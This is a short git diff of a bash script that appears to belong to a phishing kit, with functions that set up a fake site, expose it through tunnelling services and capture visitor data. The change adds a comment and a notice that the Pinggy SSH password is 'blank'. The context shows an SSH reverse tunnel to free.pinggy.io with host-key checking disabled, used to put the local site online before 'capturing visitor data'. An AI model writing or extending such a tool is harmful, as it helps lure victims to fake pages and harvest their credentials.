@@ -508,6 +508,7 @@ start_loclx() {
 	capture_data
 }
 
+## Start pinggy
 start_pinggy() {
     read -p "[?] Enter your local port to start server on (default 8080): " port
     port=${port:-8080}
@@ -516,6 +517,7 @@ start_pinggy() {
     setup_site  # Your server start command or function
     sleep 3
 
+	echo -e "\e[1;31m[!!! IMPORTANT !!!] SSH password is: blank (type 'blank' when prompted)\e[0m"
     echo -e "\n[+] Starting Pinggy tunnel forwarding localhost:$port ...\n"
     ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:$port qr@free.pinggy.io &
 
@@ -523,7 +525,6 @@ start_pinggy() {
 
     capture_data  # Start capturing visitor data
 }
-
 
 ## Start localhost
 start_localhost() {
